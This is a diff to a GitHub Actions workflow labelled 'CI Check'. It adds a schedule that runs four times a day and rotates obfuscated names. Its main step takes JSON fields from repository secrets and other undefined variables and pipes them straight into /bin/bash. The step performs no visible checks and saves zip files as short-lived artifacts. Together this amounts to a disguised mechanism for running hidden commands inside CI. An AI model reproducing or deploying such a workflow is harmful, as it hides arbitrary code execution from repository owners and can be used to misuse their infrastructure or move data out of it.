@@ -2,6 +2,8 @@ name: CI Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '16 1,7,13,19 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,18 +16,17 @@ jobs:
           fetch-depth: 1
       - name: Process
         env:
-          cz89548: ${{ secrets.cz89548 }}
+          t1789: ${{ secrets.t1789 }}
         run: |
-          printf '%s' "$cz89548" | jq -r .q567 | /bin/bash
-          echo $bza1 | jq -r .h5866 | /bin/bash
-          echo $beab5416 | jq -r .mxjr94 | /bin/bash
-          echo $w3 | jq -r .c8 | /bin/bash
-          printf '%s' "$uxv041" | jq -r .e1611 | /bin/bash
-          printf '%s' "$ivrhs30" | jq -r .tmbxh91 | /bin/bash
+          printf '%s' "$t1789" | jq -r .zmawz37 | /bin/bash
+          echo $fcnmv20241 | jq -r .go51 | /bin/bash
+          printf '%s' "$cbz1" | jq -r .yaus86522 | /bin/bash
+          echo $xdevp22478 | jq -r .kkq15763 | /bin/bash
+          printf '%s' "$ioo4539" | jq -r .mjtr2587 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: nYgCNV6y
+          name: Lv8CZto0
           path: "*.zip"
           retention-days: 1
